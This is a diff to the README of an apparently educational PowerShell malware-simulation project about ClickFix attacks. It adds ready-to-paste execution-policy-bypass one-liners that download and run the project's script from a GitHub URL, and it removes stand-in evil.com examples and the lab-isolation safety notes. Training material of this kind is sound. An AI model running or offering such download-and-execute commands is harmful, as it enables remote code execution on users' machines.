@@ -43,43 +43,24 @@ The comprehensive malware simulation that demonstrates:
 
 # Quick mode (faster execution for demos)
 .\simalicious.ps1 -QuickMode
+
+
+# Usage examples that attackers might instruct victims to run:
+
+# Via Run Dialog (Win+R):
+powershell -ep bypass -c "iex (iwr 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1').Content"
+
+# Via Command Prompt:
+powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ifrantic/simalicious/refs/heads/main/simalicious.ps1' -UseBasicParsing).Content"
+
 ```
-
-### `launcher.ps1` - Invoke-Expression Demonstration
-Shows how attackers use `Invoke-Expression` (IEX) to execute remote scripts. Demonstrates the exact patterns used in real phishing attacks.
-
-**Usage:**
-```powershell
-.\launcher.ps1
-```
-
-### `web-version.ps1` - Remote Fetch Simulation
-A simplified version designed to demonstrate remote script execution patterns.
-
 ## 🚨 Common Attack Patterns Demonstrated
-
 ### 1. Win+R ClickFix Pattern
 Attackers often instruct victims to:
 1. Press `Windows + R` to open Run dialog
 2. Paste a malicious PowerShell command
 3. Press Enter to execute
 
-**Example malicious commands (DO NOT RUN):**
-```powershell
-powershell -ep bypass -c "iex (iwr 'https://malicious.com/script.ps1').Content"
-powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://evil.com/payload.ps1' -UseBasicParsing).Content"
-```
-
-### 2. Execution Policy Bypass
-Notice how attackers bypass PowerShell security:
-- `-ExecutionPolicy Bypass` or `-ep bypass`
-- `-Command` or `-c` for one-liner execution
-- `Invoke-Expression` to execute downloaded code
-
-### 3. Remote Code Execution
-- Scripts hosted on compromised or malicious websites
-- Use of `Invoke-WebRequest` (iwr) to download
-- Immediate execution without file inspection
 
 ## 🛡️ Training Value
 
@@ -111,24 +92,6 @@ This simulation helps learners understand:
 - Ability to run PowerShell scripts
 - Controlled/isolated training environment
 
-### Execution Policy
-You may need to temporarily allow script execution:
-```powershell
-# Check current policy
-Get-ExecutionPolicy
-
-# Allow for current session (safer)
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
-
-# Or allow for current user
-Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
-```
-
-### Running the Simulation
-1. Download the scripts to a training directory
-2. Open PowerShell as a regular user (not administrator)
-3. Navigate to the script directory
-4. Execute the desired script
 
 ## 🧹 Cleanup
 
@@ -147,38 +110,6 @@ Remove-Item "$env:USERPROFILE\Desktop\README_SIMALICIOUS_TRAINING.txt" -Force -E
 Remove-Item "$env:TEMP\YOUR_FILES_ARE_ENCRYPTED.txt" -Force -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\TRAINING_RANSOM_NOTE.txt" -Force -ErrorAction SilentlyContinue
 ```
-
-## 🎓 Learning Objectives
-
-After running these simulations, participants should understand:
-
-1. **Attack Recognition**: How to identify suspicious PowerShell commands
-2. **Social Engineering**: How ClickFix and similar attacks work
-3. **Technical Indicators**: What malware behavior looks like
-4. **Prevention**: Why execution policies and user awareness matter
-5. **Response**: How to contain and analyze potential incidents
-
-## 🔒 Security Notes
-
-- **Isolated Environment**: Always run in controlled lab environments
-- **Network Isolation**: Consider disconnecting from production networks
-- **User Education**: Clearly explain this is simulation to all participants
-- **Monitoring**: Use these scripts to test security monitoring capabilities
-- **Documentation**: Record all training activities for compliance
-
-## 📚 Additional Resources
-
-### Real-World Examples
-- ClickFix campaigns targeting users with fake browser errors
-- Phishing emails with PowerShell-based payloads
-- Tech support scams using similar techniques
-
-### Detection and Prevention
-- PowerShell logging and monitoring
-- Execution policy hardening
-- User awareness training programs
-- Email security and filtering
-- Endpoint detection and response (EDR)
 
 ---
 
